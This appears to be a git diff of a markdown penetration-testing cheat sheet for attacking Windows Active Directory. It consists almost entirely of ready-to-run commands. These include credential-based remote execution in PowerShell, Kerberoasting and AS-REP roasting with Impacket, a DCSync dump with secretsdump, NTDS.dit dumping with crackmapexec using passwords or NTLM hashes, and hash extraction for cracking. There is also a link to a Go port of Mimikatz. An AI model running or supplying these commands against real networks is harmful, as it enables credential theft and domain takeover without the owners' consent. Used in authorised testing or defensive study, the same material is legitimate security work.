@@ -73,15 +73,15 @@ Native Windows command :
 rundll32 keymgr.dll, KRShowKeyMgr
 ```
 Savoir : Mimikatz recompiled in Go lang : https://github.com/vincd/savoir
-
 ## Impersonation
+To execute commands with another account :
 ```powershell
 $password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
 Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
 ```
-
-## Kerberoast
+## Kerberos attacks
+### Kerberoast
 GetUserSPNs and get hashes :
 ```bash
 impacket-GetUserSPNs -request -dc-ip IP_ADDRESS DOMAIN/USERNAME -outputfile hashes.kerberoast
@@ -90,28 +90,25 @@ If you get hashes, try to crack it and then use DCSync exploit :
 ```bash
 impacket-secretsdump -just-dc-ntlm DOMAIN/USERNAME:PASSWORD@DC_IP
 ```
-
-## AS-REP Roasting
-Look for users without Kerberos pre-authentication required attribute (using credential) :
+### AS-REP Roasting
+Look for users without Kerberos pre-authentication required attribute (using credential, low privilege) :
 ```markdown
-impacket-GetNPUsers -dc-ip <IP-DC> domain/username:password
+impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
 ```
-
 Get a TGT for a user, whithout his password, if you know that this account have Kerberos pre-auth disabled :
 ```markdown
-impacket-GetNPUsers -dc-ip <IP-DC> domain/username -no-pass
+impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME -no-pass
 ```
-
 ## NTDS Exfiltration
-
-Dump NTDS :
-
+Once you get domain admin, dump NTDS.dit to get all the hashes from the Active Directory :
 ```markdown
-crackmapexec smb IP -u "USERNAME" -p "PASSWORD" -d "DOMAIN" --ntds
+crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -p 'PASSWORD' --ntds
 ```
-
-Extract hashes from NTDS :
-
+Use with -H option to use NTLM hash :
+```markdown
+crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN' -u 'USERNAME' -H 'NTLM_HASH' --ntds
+```
+Then, extract all the hashes to put them on hashcat.
 ```markdown
 cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
 ```
